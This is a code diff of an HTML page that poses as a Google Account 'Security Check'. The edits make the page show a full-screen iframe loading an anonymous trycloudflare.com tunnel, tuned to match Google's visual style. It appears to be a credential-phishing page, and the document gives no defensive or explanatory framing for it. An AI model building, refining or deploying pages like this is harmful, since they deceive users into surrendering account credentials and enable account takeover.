@@ -6,14 +6,13 @@
     <meta name="theme-color" content="#121212">
     <title>Google Account - Security Check</title>
     <style>
-        /* Reset totale */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* SFONDO UNIVOCO */
+        /* Colore esatto estratto dalla tua foto di Google */
         body, html { 
             height: 100%; 
             width: 100%; 
@@ -22,34 +21,24 @@
             font-family: 'Roboto', Arial, sans-serif;
         }
 
-        /* IL WRAPPER: Usiamo il padding per posizionare il logo Google in alto correttamente */
-        .iframe-wrapper {
-            position: absolute;
+        /* Rimuoviamo il wrapper e usiamo l'iframe a schermo intero reale */
+        iframe { 
+            position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            /* Spazio minimo in alto per non far toccare l'ora del telefono */
-            padding-top: 15px; 
-            background-color: #121212;
-            z-index: 2;
-            display: flex;
-            justify-content: center;
-        }
-
-        iframe { 
             width: 100%; 
-            /* Altezza aumentata per far scorrere la pagina naturalmente */
             height: 100%; 
             border: none; 
             display: block;
-            background-color: transparent;
+            /* Questo elimina lo stacco visivo in fondo alla pagina */
+            margin-bottom: -1px; 
+            background-color: #121212;
+            z-index: 1;
         }
 
-        /* Caricamento */
+        /* Spinner centrato per il caricamento iniziale */
         .loader-container {
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -57,7 +46,7 @@
             position: absolute;
             top: 0;
             left: 0;
-            z-index: 1;
+            z-index: 0; /* Sta sotto l'iframe */
             background-color: #121212;
         }
 
@@ -79,9 +68,7 @@
         <div class="spinner"></div>
     </div>
 
-    <div class="iframe-wrapper">
-        <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
-    </div>
+    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>
 
 </body>
 </html>
